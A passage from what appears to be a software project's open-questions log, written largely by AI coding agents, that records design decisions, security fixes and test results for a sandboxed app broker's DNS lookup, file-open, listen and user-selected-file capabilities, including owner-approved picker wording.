caught the bug, and had not yet restored it when the session ended -- confirmed on resume by
running the suite cold: `node-fs-adapter-open.test.ts`'s "an abrupt reason never raises an
unhandled process-level error" failed with an escaped `EBADF`. Chasing it found a SECOND,
previously-undiscovered escape past the same `nodeStream.on('error', () => {})` guard the file's
own header already documents: `Writable.toWeb`'s wrapper settles `writer.closed`/`writer.ready`
AND each individual `writer.write(chunk)` call's own promise on the same premature-close path,
none of which that raw-stream 'error' listener touches. Confirmed directly, not assumed, before
picking a fix: a `writer.abort()` at the WHATWG layer avoids the escape entirely but WAITS for an
in-flight write instead of interrupting it, silently turning 'revoked' into a flush (the full
64 KiB chunk landed in a throwaway probe, where the test requires it discarded). The fix that
keeps both properties -- `node-fs-adapter.ts`'s `writable()` now wraps `getWriter()` so it can
attach a silent `.catch(() => {})` to `.closed`, `.ready`, and every `.write()` call's own
promise the instant the caller acquires a writer, alongside whatever handler the caller attaches
itself, never instead of it -- while `destroy()`'s actual teardown (`stream.destroy()`, called
synchronously, immediately) is completely unchanged from before this fix.

**Verified, this lane, after the fix above:** `npm run typecheck` clean; `npm test` 183 files
passed (0 failed), 4347 passed, 3 skipped -- against this brief's own stated main baseline of 181
files / 4300 passed / 3 skipped, the difference being this lane's own new test files and cases,
all green, no regressions; `npm run check:size`, `check:comments`, `check:contracts`,
`check:natives`, `check:secrets`, `check:questions` and `check:manifest-parity` all pass. Full
numbers and the PR body are in this lane's own log
(`/home/jhon/.claude/orivon-fleet/lanes/L2-fsopen/log.md`).

**A separate, fleet-level numbering collision, not this lane's to resolve:** an unmerged sibling
branch (`stream/shim-13-refuse-on-call-not-read`, commit `96962c8`) also claims A184, for an
unrelated fix ("refuse an unimplemented shim member on call, not on read"). Neither branch's
`open-questions.md` currently shows a duplicate -- `npm run check:questions` passes clean on
this branch -- because the collision only exists ACROSS the two unmerged branches, not within
either one alone. Whichever of the two merges second will need to renumber.
### A171 -- `orivon.net.lookup`'s broker implementation built A167's union-of-three-capabilities reading, plus two judgment calls of its own **[AI-REC -- confirm alongside A167]**

**Raised 2026-09-15**, lane L4-dns (`stream/broker-16-net-lookup`), which built `broker.net.lookup`,
its control-channel dispatch and its page surface against A167's still-unconfirmed reading of
`d-0030`. That reading is what got built: `hostname` is checked against the HOST portion of
every pattern in the UNION of whatever `tcp.connect`, `https.connect` and `udp.send` grants the
origin holds (the first of those, checked in that fixed order, whose patterns authorise it is
also what SCOPES revocation -- see below). Two more judgment calls this lane had to make that
A167 named but did not settle:

**1. A82's reserved-port carve-out does not apply to a lookup at all.** A lookup has no port, so
the question is not "does a reserved port narrow this" but "does it matter which port a pattern
names." This lane's answer: no. `checkLookup` (`src/broker/policy/lookup.ts`) checks the HOST
portion only, regardless of the pattern's own port -- so a hostname granted only on a reserved
port (`mail.example.com:25`, say) still authorises its own lookup. The safety argument, written
out in `src/broker/policy/README.md`'s Design notes for `lookup.ts`: whatever port a pattern
names, the app already knows it (it is in the app's own held grant, readable via
`app.grants()`) and can already force that exact hostname resolved today by replaying the same
host:port through `net.connect` -- `checkConnect`'s own pre-resolve gate
(`couldAnyPatternMatch`) lets a granted pattern's host through to the real resolver before any
port or address is checked, reserved-port carve-out included, since a pattern that NAMES a
reserved port exactly is exempted from it by design (`reserved-ports.ts`'s own
`patternNamesPortExactly`). `lookup` authorised the same way hands back a name-to-address
MAPPING the app did not have before; it never hands back the ability to force a name resolved
that `connect`/`connectSecure`/`udpBind` could not already force.

**2. Which grant's revocation cancels an authorised lookup, when more than one held grant would
authorise the same hostname.** Not specified anywhere -- this lane's answer: the first
capability in the fixed check order above (`tcp.connect`, then `https.connect`, then
`udp.send` -- `net-capability.ts`'s own `OUTBOUND_CAPABILITIES`) whose patterns actually
authorise the hostname is what `handleTable.run`'s revocation scope binds to. A DIFFERENT held
grant for the same origin being revoked must not cancel an in-flight lookup that a still-live
grant authorised -- tested directly (`src/broker/tests/net-lookup.test.ts`, "is not cancelled by
revoking a DIFFERENT held grant than the one that authorised it").

**Not flagged, reused rather than invented:** the error split (`'denied'` for a hostname outside
every held grant, `'unreachable'` with a real `platformCode` for a permitted name that does not
resolve) follows `connect`'s own established rule, and no new `OrivonErrorCode` was needed
(A167's own note on this already stands).

**The two pre-existing mock breaks A167 flagged** (`src/nostr/tests/nip07.test.ts`,
`src/shim-electron/tests/index.test.ts`) **did not reproduce on this branch** -- `npm run
typecheck` found seven breaks, all caused by this lane's own `CreateBrokerOptions.resolveLookup`/
`Broker.net.lookup` additions rippling into other test files' hand-built mocks (adapters tests,
`ipc.test-helpers.ts`, `sync-fs-policy.test.ts`, both e2e capability tests), all fixed here as
the mechanical one-stub-per-file change A167 anticipated. Whatever fixed the two A167 named must
have landed on `main` between that lane and this one; not otherwise investigated.

**Verified, this lane:** `npm run typecheck` clean; `npm test` 4298 passed, 3 skipped (pre-
existing, unrelated) across 181 files; `npm run check:size`/`check:comments`/`check:contracts`/
`check:natives`/`check:secrets`/`check:questions`/`check:manifest-parity` all pass -- the last
one confirming `net.lookup` adds no manifest key, exactly as designed (it rides the existing
network declaration).

**Still open:** A167's union-of-three-capabilities reading itself remains AI recommendation, not
an owner decision -- this lane built against it rather than waiting, per its own brief, but the
owner should confirm A167 (and the two judgment calls above, which only exist because that
reading was taken as given) before `net.lookup` reaches a production grant path.

**Needed by:** lane L6 (`src/shim/node-dns.ts`'s real `dns.lookup` shape, A107) -- this lane
deliberately left that file untouched, per its own scope.

**Amended 2026-09-15 by the conductor, during the `src/broker/` hand-review, before merge.** The
lane's `checkLookup` decides on the NAME, which is correct and is where `d-0030`'s bound lives --
but nothing filtered the resolver's ANSWER. `connect` refuses a private, loopback or link-local
result for both pattern kinds that can authorise a lookup (`policy/connect-patterns.ts`:
`any-public-unicast` and `hostname` both end in `isPublicUnicast(address)`), so an unfiltered
lookup handed an app the internal addresses of a network it can never reach -- the user's router,
NAS and intranet hosts, enumerable by name under an ordinary `*:*` grant and carried back out over
a granted host. **Fixed, not filed:** the result is now filtered through the same
`isPublicUnicast` `connect` uses, and an answer with nothing reachable left rejects `'unreachable'`
rather than `'denied'` or an empty array, so an app cannot tell an existing internal name from a
non-existent one one probe at a time.

Two of the lane's own tests failed against the fix and **both failures were fixture artifacts, not
the assertions**: they used RFC 5737 documentation addresses (`203.0.113.x`, `198.51.100.x`), which
`isPublicUnicast` refuses exactly as it refuses a private one -- verified by probing the real
function rather than reasoning about it. The assertions they make (an unlimited grant resolves any
name; a reserved-port grant still authorises its own lookup) are unchanged and still pass against a
routable fixture.

### A185 -- `net.listen`'s accept-demand signal reuses `CreditMessage` rather than a new wire member, and the highWaterMark: 0 property had to be proven end to end through three new layers **[AI-REC -- confirm alongside A167]**

**Raised 2026-09-15**, lane L3-listen-page (`stream/preload-06-listen-page`), which built the
page-reachable half of `orivon.net.listen` (A114/d-0028): `broker.net.listen`'s already-complete
`connections` stream, delivered to a real page as a real `TcpServer.connections` `ReadableStream`.
This run resumed a predecessor cut off mid-work by a session-limit interruption (committed as
`b61d9e8`); this entry covers the judgment call the predecessor's own code comments already
pointed here for (`accept-pump.ts`, `server-port.ts`) but never wrote up, plus what this run found
and fixed finishing the landing.

**1. The judgment call: one accepted connection is ONE unit of demand, signalled by reusing
`CreditMessage` (`{kind:'credit', handleId, bytesConsumed}`) rather than a new
`RendererToBrokerMessage` member.** `src/broker/transport/accept-pump.ts`'s `handleDemand`
interprets `bytesConsumed` as a COUNT of connections rather than bytes; `src/preload/server-port.ts`'s
`reportAccepted` always sends `bytesConsumed: 1`, one call per app `connections.getReader().read()`.
The alternative -- a purpose-built member, e.g. `{kind:'accept', handleId}` -- was not built: A167
closed `src/contracts/` for this lane (its own scope rule: three shapes landed, no new
`RendererToBrokerMessage` member among them), and `CreditMessage`'s existing wire shape already
means "the renderer is ready for more," so reinterpreting its one field costs nothing to the wire
protocol at the price of a field name (`bytesConsumed`) that means something different on a
server's own port than it does on a socket's. **Confirm:** does the reused field stand, or is a
purpose-built member worth a `src/contracts/` change now that the implementation exists to show
what it would look like?

**2. Verified end to end, not just asserted: `highWaterMark: 0` survives all three new layers.**
This is the property the brief named as the one most likely to be silently destroyed by a page-side
wrapper that eagerly drains `connections` -- if it were, the broker would accept connections nobody
asked for. Proven at each layer with an explicit "N reads accept exactly N connections, and an
unread server accepts none" test: `accept-pump.test.ts` (the broker's own pump), `server-port.test.ts`
(the isolated-world preload state machine), and `main-world-socket-listen.test.ts` (the page's own
`ReadableStream`, constructed with `CountQueuingStrategy({ highWaterMark: 0 })` in
`main-world-socket.ts`'s `buildServer`, whose `pull()` is the ONLY caller of `reportAccepted` --
enforced by construction, not just convention, since nothing else in the isolated or main world
holds a reference to it).

**3. Found and fixed, independent of the merge conflict this run also resolved: `net.listen` was
declared reachable but was never actually dispatched on `main`.** `src/broker/transport/
ipc-validation.ts`'s `ControlMethod`/`isControlMethod` already listed `'net.listen'` (landed by
the contracts-adjacent split before this run resumed), but neither `ipc.ts`'s pre-split `dispatch()`
switch nor `dispatch-net.ts`'s post-split one had a matching `case` -- a call would have fallen
through to the end of the switch and resolved `undefined` instead of erroring or listening,
exactly the silent-gap shape the brief's first warning described for `message.kind` switches.
Fixed by adding the case, and separately by adding a `never`-typed default case to BOTH `ipc.ts`'s
`dispatch()` and `dispatch-net.ts`'s `dispatchNet()` switches, so a future `ControlMethod`/
`NetControlMethod` member with no matching case is a compile error rather than a silent
`undefined` -- neither switch had one before. `src/preload/socket-port.ts` and
`src/preload/datagram-port.ts`'s own `message.kind` switches already had an equivalent
exhaustiveness guard (the predecessor's own work, before the interruption); this run did not find
or need to change either.

**Verified, this run:** `npm run typecheck` clean; `npm test` 4358 passed, 3 skipped across 186
files (baseline on `main` before this merge: 4300 passed, 3 skipped, 181 files -- the difference
is this lane's five new test files); `npm run check:size`/`check:comments`/`check:contracts`/
`check:natives`/`check:secrets`/`check:questions` all pass. `npm run test:e2e` was deliberately
**not run** -- this lane does not launch Electron; see this run's own log for what a real e2e
should prove.

**Needed by:** whichever lane wires a production `tcp.listen` grant and the Node-shaped
`net.createServer` shim that actually calls this surface -- this lane, like A114 before it,
stops at a real grant reaching a real page; nothing here issues one in production.

### A187 -- `orivon.fs.userSelected` is built end to end at the broker layer (confinement, persistence, both revocation-cascade halves), deliberately NOT wired to a page yet **[AI-REC -- page-reachability deferral is a scope call tied to the open owner gate below; the other judgment calls are flagged, not owner-reviewed]**

**Raised 2026-09-15**, lane L5-userselected (`stream/main-10-user-selected`), built directly on
top of `orivon.fs.open` (A184, merged same day). `DirectoryHandle`/`FileHandle` from the picker
(`d-0029`, A167 item 2) needed no `src/contracts/` change -- the shape was already complete -- so
this lane built the broker capability (`src/broker/user-selected-capability.ts`), the picked-path
state (`src/broker/grants/picked-path-ledger.ts`), the persistence slice sharing `GrantLedger`'s
own on-disk file (`src/broker/grants/ledger-storage.ts`/`node-ledger-storage.ts`), the handle-
table's own revocation index for a pick (`byPickedPath`, `HandleTable.revokeUserSelected`,
`src/broker/handles/`), and the settings-list extension (`src/main/permissions.ts`,
`settings-ipc.ts`, `src/preload/settings.ts`, `src/renderer/settings/`).

**What is genuinely done, tested against both revocation-cascade halves and against a simulated
restart:** `userSelected` for both the folder and file shapes, confined to the PICKED root (never
the app's own files directory) through the same `confinePath` fs-capability.ts already uses,
under the same per-origin fs write quota, with the picker's cancel resolving `null`/`[]` rather
than rejecting. Revoking the standing `fs` grant does not touch a picked handle; revoking the
pick itself (`Broker.revokeUserSelectedPath`, addressed by a pickId minted once and shared
between the handle table's index and the persisted record) does, and the persisted record itself
survives a simulated broker restart (`src/broker/tests/user-selected.test.ts`,
`src/broker/grants/tests/picked-path-ledger.test.ts`, `src/broker/grants/tests/
node-ledger-storage-picked-paths.test.ts`, `src/broker/handles/tests/handles-user-selected.test.ts`).

**Still open, by design, a scope call rather than a gap discovered mid-build:** there is no
CONTROL_CHANNEL case delivering `userSelected` to a real page, and the preload exposes nothing on
`window.orivon.fs.userSelected` -- `broker.fs.userSelected(origin, opts)` is real and directly
callable (by a test, or a future main-process caller) but not yet page-reachable, the same
category of gap A184 itself left for `readable()`/`writable()`. Doubly deliberate here: this
lane's own owner gate (queue item 4.3, below) leaves the picker's wording unapproved, so wiring
the page-facing surface now would let a picker with unreviewed copy reach a real app before that
review happens. The real Electron `dialog.showOpenDialog` call IS wired (`src/broker/transport/
ipc.ts`'s `pickPath`), deliberately textually neutral -- no `title`/`buttonLabel`/`message` yet --
so `broker.fs.userSelected` is exercisable end to end today by anything that can reach the broker
directly, just not by an app's own page.

**Flagged AI judgment calls, not owner-reviewed:**

1. **A `DirectoryHandle` is registered under `HandleKind: 'file'`**, not a new `'directory'` kind
   -- it shares `LIMITS.concurrentFileHandles` with an open fd rather than getting its own budget.
   Reasoning: a `DirectoryHandle` holds no OS descriptor (it is a confined root plus relative-path
   operations), so the exhaustion risk a per-kind budget exists to bound is smaller than a real
   fd's, and a fourth `HandleKind` would touch `OriginCounts`/`#census` in `handle-store.ts` for
   a distinction nothing downstream currently needs.
2. **A file opened via `DirectoryHandle.open()` shares the SAME `pickId` as the folder itself**,
   registered as a second row under the identical `Authorisation` rather than a derived handle
   (`acquireDerived` is a tcpSocket-only mechanism, `handles.ts`'s own guard rejects any other
   kind). Consequence: revoking the FOLDER pick also closes a file opened from inside it, for
   free, via the shared `byPickedPath` bucket -- tested directly. The converse is NOT built:
   closing the `DirectoryHandle` itself (`close()`, not a revoke) does NOT cascade to files opened
   from it, since no parent/child edge exists between them. Judgment call, not specified by the
   contract either way.
3. **Each individually-picked FILE (the `multiple: true` shape) gets its OWN, distinct `pickId`**,
   never one pickId shared across a whole `userSelected()` call's results. Reasoning: this lane's
   own brief's "breadth must be visible -- a narrow request must not look like a broad one" applies
   to REVOCATION granularity too, not only to wording -- revoking one of three picked files must
   not silently take the other two with it.
4. **What "persists across restarts" (D-0007) actually buys, given the contract has no "reuse a
   prior pick without a fresh OS dialog" entry point.** A167 already flagged this exact ambiguity
   for the folder picker's landing and left it for "the broker lane that builds fs.open/
   fs.userSelected" to resolve -- this is that resolution. Read literally against D-0007's own
   text ("persisted picked paths need somewhere to live and a revocation path"): persistence means
   the settings list shows and can revoke a pick across a restart, exactly like a persisted grant
   already does. It does NOT mean a later `userSelected()` call skips the native OS dialog for a
   previously-picked path -- there is no contract method for that, and building one unasked would
   contradict "the user's choice in the OS picker IS the consent" for a pick the CURRENT call never
   actually made. Every live `userSelected` handle is torn down at session end regardless
   (`HandleTable.dropOrigin` already takes `userSelected` handles, unchanged by this lane); only
   the on-disk record and its revocability survive.
5. **A picked FILE is always opened with flags `'r+'`**, never exposed as a raw path or a choice
   of flags. Reasoning: `dialog.showOpenDialog` only ever names an EXISTING file (a save dialog is
   a different, unbuilt Electron method), so read-write against an existing file is always valid,
   and the contract's `userSelected` file shape returns `FileHandle`, not a string, so there is
   nowhere to carry a flags argument even if one were wanted.
6. **A picked path's bytes count against the SAME per-origin `fs.quotaBytes` counter** an app's
   own files directory already uses (`GrantLedger.reserveFsBytes`/`releaseFsBytes`), rather than
   being unmetered or getting a separate counter. Reasoning: writing through a user-granted folder
   must not be a way around a declared storage limit -- tested directly.
7. **`PickedPathLedger` is a THIRD state class alongside `GrantLedger` and `HandleTable`**
   (`src/broker/grants/picked-path-ledger.ts`), not a new field/method set inside `GrantLedger`.
   `grant-ledger.ts` landed A184 at exactly 500 lines with zero headroom (code-guidelines.md
   Rule 2), so any addition there needed either a Rule-2 split of an unrelated concern first, or a
   sibling class -- the sibling was smaller and cleaner, and matches `createBroker`'s own existing
   "kept apart on purpose" split between `GrantLedger` and `HandleTable`. Storage is still SHARED
   with `GrantLedger`'s own per-origin file (D-0007's own "P4-3 and P4-4 now share a surface"
   instruction) -- `writeGrants`/`writePickedPaths` in `node-ledger-storage.ts` each preserve the
   other's slice of that one JSON file, tested directly for both directions.
8. **`confineToRoot`'s bypass for `DirectoryHandle.readdir()`/`stat()` when `path` is omitted.**
   `confinePath` itself refuses a requested path that resolves to the root (`'is-root'`) by
   design, for an APP-SUPPLIED path -- but `handles.ts`'s own `DirectoryHandle` doc requires
   omitting `path` to target the root itself. This lane's `root` is broker-computed (realpath'd
   once at acquisition, from the OS picker's own result, never from anything the app supplied), so
   it is used directly rather than being run back through the check built to reject exactly that
   input. `confinePath`'s own doc already draws this line: `root` is "broker-supplied, trusted for
   shape."
9. **`src/shim-electron/dialog.ts`'s `showOpenDialog` refusal is updated, not fixed.** Its
   `'not-built'` reason and doc comment were stale the moment this lane's broker capability
   landed (it no longer says the broker "does not implement it yet" -- it now names the REAL
   remaining gap: `orivon.fs.userSelected` resolves an opaque `FileHandle`/`DirectoryHandle`,
   never the raw host path Electron's own `showOpenDialog` returns, and presenting Node's
   path-string idiom over that opaque handle is a genuine shim-layer design question this lane did
   not attempt to answer -- `src/shim-electron/` is outside this lane's owned paths (`src/broker/`)
   regardless of the docs gap. Filed here rather than guessed at.

**OWNER GATE, still open (queue item 4.3) -- the picker's own wording.** This lane built the
mechanism (the real `dialog.showOpenDialog` call, deliberately carrying no `title`/`buttonLabel`/
`message` yet) and a settings-list row renderer that reuses the existing plain `.permission-row`
markup verbatim (no new CSS). The PROPOSED wording for both -- the native dialog's own text and
the settings-list row's message -- is written out in full in this lane's own log
(`/home/jhon/.claude/orivon-fleet/lanes/L5-userselected/log.md`), per the owner's standing
instruction that they review wording during development rather than at the end. Nothing here is
finalised; `describePickedPath` (`src/main/permissions.ts`) carries the same "PROPOSED, NOT
OWNER-REVIEWED" marker in its own doc comment.

**Verified, this lane:** `npm run typecheck` clean; `npm test` 4489 passed, 3 skipped across 194
files (baseline on `main` before this merge, after `fs.open`/A184: 4438 passed, 3 skipped, per
this lane's brief); `npm run check:size`/`check:comments`/`check:contracts`/`check:natives`/
`check:secrets`/`check:questions`/`check:manifest-parity` all pass. `npm run test:e2e` was
deliberately **not run** -- this lane does not launch Electron; see this lane's own log for what
a real e2e should prove once the wording gate clears.

**Needed by:** whichever lane resolves the owner gate above and wires the CONTROL_CHANNEL case
plus the preload surface (this lane's own "still open" section, item 1) -- this lane, like A184
and A185 before it, stops at a real capability reaching a real page.

### A186 -- lane L6-shim's dispatch brief said `orivon.fs.open` was merged (PR #204); at this
lane's own cut point it is not, and A184 (cited in this lane's own code) has no entry here yet
**[RESOLVED 2026-09-15 -- the branch landed as PR #204; this lane now builds on it directly]**

**Raised 2026-09-15**, lane L6-shim (`stream/shim-14-server-open-dns`), building the Node shapes
over `net.createServer`, `fs.open` and `dns.lookup`. Two of the three capabilities this lane was
told to build on ARE reachable at `origin/main @ f2bc8e0` (this lane's own cut commit), verified
by reading the actual dispatch/preload wiring, not by trusting the brief: `net.listen` (PR #203)
and `net.lookup` (PR #201) both have real broker dispatch cases and real preload/main-world
bridges (`src/broker/transport/dispatch-net.ts`'s `'net.listen'`/`'net.lookup'` cases,
`src/preload/net-surface.ts`'s `netListenBridge`/`netLookupBridge`,
`src/preload/main-world-socket.ts`'s `buildServer`/`netLookup`). **The third is not.**

**`orivon.fs.open`'s broker half and preload wiring are NOT on `main` at this lane's cut point.**
`src/broker/fs-capability.ts`'s own header says so directly ("`FileHandle` (orivon.fs.open) is
NOT here -- see this lane's own PR body for why it was parked"), there is no `'fs.open'` dispatch
case anywhere under `src/broker/transport/`, and `src/preload/orivon-surface.ts`'s `exposeOrivon`
wires `fs.readFile`/`writeFile`/`mkdir`/`readdir`/`stat`/`rm`/`rename` but no `fs.open`. The work
lives on an unmerged branch, `stream/broker-15-fs-open` (confirmed via `git log`: `09e7b2b`
"Merge remote-tracking branch 'origin/main' into stream/broker-15-fs-open", `fcbd525` "Restore
fs.open's abrupt-close fix..."), not an ancestor of this lane's own base commit
(`git merge-base --is-ancestor 09e7b2b f2bc8e0` returns false). This matches the standing warning
already carried at the top of this run ("Seven unmerged branches from an earlier session carry
A169-A183") -- `stream/broker-15-fs-open` is evidently an eighth, undercounted the same way.

**A184 does not exist in `docs/open-questions.md` on `main` either**, though this lane's own
brief cites it as an already-recorded fact ("FileHandle.readable()/writable() are built in the
broker but are NOT page-reachable yet (recorded as A184)"). The most likely explanation is that
A184 was filed on `stream/broker-15-fs-open` itself (the branch that would have discovered this
gap while building `fs.open`'s broker half) and has simply not reached `main` yet, for the same
reason its own branch has not. `npm run check:questions` only rejects a DUPLICATE `### A<n>`
heading within one file; it does not require every A-number a branch cites in source actually
resolve to a heading on that branch, so this lane's own `docs/open-questions.md A184` citations
(`node-fs-handle.ts`, `node-fs.ts`, their tests, `README.md`) pass CI here regardless, and will
resolve correctly once `stream/broker-15-fs-open` (or whatever carries A184's actual text) merges
before or alongside this lane.

**What this lane did about it, since the contract types (`src/contracts/handles.ts`'s
`FileHandle`, `src/contracts/capability-api.ts`'s `OrivonFs.open`) ARE already stable on `main`
regardless of the broker/preload wiring's merge status:** built and fully unit-tested
`node-fs-handle.ts` (the local cursor, the callback family, the A184-citing
`createReadStream`/`createWriteStream` refusal) entirely against that type contract, using a
fake `orivon.fs.open` in every test -- never against a live broker, which this lane was told not
to launch anyway. The code is correct against the contract and will start working the moment
`fs.open` actually lands on `main`; it cannot be exercised end to end before that, and this lane
did not claim otherwise anywhere in its own log or PR body.

**Still open:** whether `stream/broker-15-fs-open` merges before this lane, requiring no action
here, or after, requiring this lane's branch to pick up whatever `fs.open`'s real dispatch/
preload shape turns out to be (this lane built against the TYPE contract only, which is the
stable, change-controlled part -- but a real implementation detail neither this lane nor the
brief could see, e.g. a different error shape on a specific failure mode, could still surface
once wired to a real broker). **Owner's decision needed:** which of the two branches should take
the merge-order dependency, and whether the fleet's own A-number floor tracking (this run's own
"the floor is NOT main's high-water mark" warning) should be extended to check unmerged branches
programmatically rather than by an agent noticing mid-lane, since this is now the second
independent discovery of the same undercount in one run.

**Resolved the same day, by the conductor, before this lane's own PR was opened.** `fs.open` merged
as **PR #204** (`main` = `c47f7c5`) minutes after this lane was dispatched, and `A184` landed with
it. This branch has since merged `main`, so the shim's `fs.open` shape now sits on the real broker
capability rather than on a type contract alone -- **4480 tests pass across the merged tree**, and
`A184`'s own entry exists.

**The lane was right to file it and right not to guess.** The brief asserted a merge that had not
happened yet at the cut commit; the lane checked rather than believed it, built against the stable
type contract regardless, and said so. **Keeping it as a resolved entry rather than deleting it,
because the underlying hazard is structural and will recur:** a brief written while a dependency is
in flight goes stale between dispatch and execution, and a lane that trusts it builds on something
absent. The cheap fix on the conductor's side is to state the dependency's commit, not just its PR
number, so a lane can verify the claim instead of taking it on faith.

### A189 -- `fs.open`'s `FileHandle` has no abandonment signal at all -- a page that opens and never closes leaks the fd and a capacity slot for the life of the process **[AI-REC -- filed, not fixed]**

**Raised 2026-09-16**, lane ADV-fix (`stream/broker-17-adversarial-fixes`), fixing the sibling
leak this same lane closed for `TcpServer` (see that fix's own commit and
`src/broker/transport/server-relay.ts`'s new comment on `cleanup()`). Both bugs share one root
cause -- a resource whose only abandonment signal is a `MessagePort` closing, reacted to by
tearing down the underlying handle -- but `FileHandle` is structurally missing the half that made
the `TcpServer` fix possible.

**The mechanism, or rather its absence.** `orivon.fs.open` (A184) returns a `FailableFileHandle`
registered in `dispatch-fs.ts`'s own `FsTransport.registry` (`src/broker/transport/dispatch-fs.ts`,
the `'fs.open'` case), but that registry has no dedicated `MessagePort` per handle the way
`net.connect`'s socket relay or `net.listen`'s server relay do -- A184's own scope cut left
`readable()`/`writable()`, and with them any per-handle port, at the broker layer only (this
document's own A184 entry, and `docs/architecture/handle-contracts.md`'s FileHandle correction).
Every other handle kind's abandonment fix in this run (`TcpSocket`'s `port.onClose` via A84,
`TcpServer`'s `port.onClose` via this lane's own fix above) hooks the SAME mechanism: the
renderer's side of a dedicated port closing, reacted to by releasing the handle. `fs.open` has no
such port to hook a `port.onClose` onto -- there is nothing to hook, structurally, not merely
nothing hooked yet.

**Consequence.** A page that calls `orivon.fs.open(...)` and lets the resulting object fall out of
scope without ever calling `close()` -- ordinary JS garbage-collection behaviour, not misuse --
leaks the real OS file descriptor and one of `dispatch-fs.ts`'s registry entries for the life of
the broker process, exactly the same shape of leak this lane's `TcpServer` fix closes, but with no
available fix of the same shape.

**`handles.ts`'s own `dropOrigin` exists and has ZERO production callers** -- confirmed by
`grep -rn 'dropOrigin' src/` before filing this: the only references are the method's own
definition and its unit test. A per-origin reaper that walked `dropOrigin` on navigation
(`session`-level `did-navigate`, or the app-loader's own teardown once build step 4 exists) would
close this gap and, incidentally, would also be a second, coarser backstop for the `TcpServer`
leak this lane just fixed directly -- but nothing today calls it, so navigating away from an origin
reaps nothing either.

**What would actually fix this, not attempted in this lane per its own brief:** either (a) give
`fs.open` a dedicated delivery port the way `net.connect`/`net.listen` have, purely to carry an
abandonment signal (a materially bigger change than this lane's scope -- A184's `readable()`/
`writable()` deferral would need revisiting too, since the natural place to add a port is the same
place those stopped), or (b) wire `dropOrigin` to a real navigation/session-teardown event, which
closes this leak and the general "an origin's handles outlive the page that opened them" class at
once rather than one handle kind at a time. Neither is a small fix; both are two-sided (a wiring
change plus, for (a), touching A184's already-shipped scope boundary), which is why this is filed
rather than attempted here.

**Owner's decision needed:** which of (a)/(b) above, or something else, and whether it is worth
doing before `fs.open` carries a real page-facing grant in production (no origin holds one today,
per the standing note at the top of this file's build-step-4 entries).

### A190 -- `net.lookup`'s capability union hands an `https.connect`-only app a DNS-reconnaissance oracle `https.connect` itself never had **[RESOLVED 2026-09-16 -- stream/broker-18-narrow-lookup-union, d-0031]**

**Raised 2026-09-16**, lane ADV-fix (`stream/broker-17-adversarial-fixes`), from an independent
adversarial review (`ADV-boundary`) of PRs #199-#205, confirmed against the code by the conductor
before this lane was dispatched to fix its two criticals -- this finding was deliberately left
unfixed and handed here to file, per this lane's own brief, because the correct answer is a
product decision, not a bug.

**Restates and sharpens A167's own flagged gap** (`policy/README.md:161-182`'s own design note,
cited there as "the union-of-three-capabilities reading as still unconfirmed") with a concrete
asymmetry A167 did not spell out: `net.lookup` authorises a hostname if ANY of `tcp.connect`,
`https.connect` or `udp.send` holds a pattern matching it (`net-capability.ts`'s
`OUTBOUND_CAPABILITIES`, `:428-478`'s `lookup`). Folding the three together is justified,
per that same design note, by the claim that a held pattern already lets an app force the broker
to resolve any name it authorises, by attempting a real connection through it -- **true for
`tcp.connect`** (`checkConnect` calls the resolver, and `couldAnyPatternMatch` lets a wildcard
pattern's host through to it before any address is checked) **and true for `udp.send`**
(`authorisedSend` reuses `checkConnect` verbatim) **but not true for `https.connect`**.
`connect-secure.ts`'s own header says so directly: `checkConnectSecure` never resolves a hostname
at all -- TLS certificate verification stands in for the address check `checkConnect` performs --
so before `net.lookup` existed, an app holding ONLY `https.connect: ["*:*"]` (a real, narrower
grant than `tcp.connect: ["*:*"]`; ADR-0017 exists specifically to offer it as the narrower
alternative) had no broker-exposed way to learn what a hostname resolves to. `net.lookup` gives it
exactly that: a general DNS oracle over any hostname it can guess, returning the real resolved
public address on success and a uniform `'unreachable'` (by design indistinguishable from "does
not resolve") when every resolved address is private -- a hostname-based LAN/infrastructure
reconnaissance primitive (enumerate `printer.local`, `nas.local`, `vpn.company.example`, ... and
learn which exist) behind a capability whose stated intent, per ADR-0017 and `connect-secure.ts`'s
own comment, was "let this app fetch over TLS," never "let this app query DNS for arbitrary
names." This does not let the app connect anywhere new -- the returned addresses are still
filtered to public-unicast only -- it is reconnaissance, not a connectivity escalation.

**Why this is filed rather than fixed here.** The plausible narrowing -- drop `https.connect` from
`OUTBOUND_CAPABILITIES` -- is a one-line, low-risk change, but it is a product decision about what
`https.connect` is understood to grant, not a bug with one correct fix: `policy/README.md` already
states the union as settled fact while its own cross-reference (A167) says the reading is
unconfirmed, and this lane's brief was explicit that narrowing it without sign-off would just
replace one undocumented assumption with another. **This lane did not touch
`OUTBOUND_CAPABILITIES` or any policy file.**

**Owner's decision needed:** either (a) drop `https.connect` from `net.lookup`'s authorising set,
accepting that an `https.connect`-only app loses the DNS-lookup convenience `net.lookup` currently
gives it, or (b) keep the union as built and record, as an explicit owner decision rather than an
unconfirmed AI reading, that `https.connect: "*:*"` is understood to also grant unrestricted DNS
resolution. Either closes A167's own cross-reference; neither has been chosen yet.

### A194 -- A187's wording gate is closed (`d-0032`); the FILE shape of `orivon.fs.userSelected` now reaches a page, and the FOLDER shape now does too **[RESOLVED 2026-09-16 -- both shapes wired; the shape question itself continues as A195]**

**Raised 2026-09-16**, lane L5-wording (`stream/main-10-user-selected`), resuming A187's own
work once the owner ruled on queue item 4.3's wording checkpoint.

**1. The wording -- owner's decision, `d-0032`, quoted verbatim.** The owner chose the strongest
of three drafted folder options, on the reasoning that "this app can read and write everywhere
inside the folder" understated what a folder grant really means to a person: it covers every
file that folder will ever hold, not only what is visible the day it is picked.

- OS picker dialog, folder: `title` `Choose a folder for "${appName}" to access`; `buttonLabel`
  `Allow access to this folder`; `message` (macOS only) `This app will be able to read, change
  and delete everything in this folder, including files you add to it later.` The phrase
  "including files you add to it later" is load-bearing (the owner's own reasoning) and is not
  trimmed anywhere it appears.
- Settings permissions row, folder (`describePickedPath`, `src/main/permissions.ts`):
  `Can read, change and delete everything in "${path}", including new files.`, `warning: true`
  (unchanged from A187 -- the same treatment an unlimited network pattern already gets).

**The FILE wording is DERIVED from the same voice, not separately owner-reviewed word for
word** -- the brief was explicit about this distinction. A `FileHandle` (`src/contracts/
handles.ts`) has no delete/unlink method, only `read`/`write`/`truncate`/`sync`, so the file
strings say what that handle actually permits (reading and changing the file's own bytes,
including emptying it) rather than claiming a "delete" it structurally cannot do:

- OS picker dialog, single file: `title` `Choose a file for "${appName}" to access`;
  `buttonLabel` `Allow access to this file`; `message` (macOS only) `This app will be able to
  read and change this file, including emptying it.`
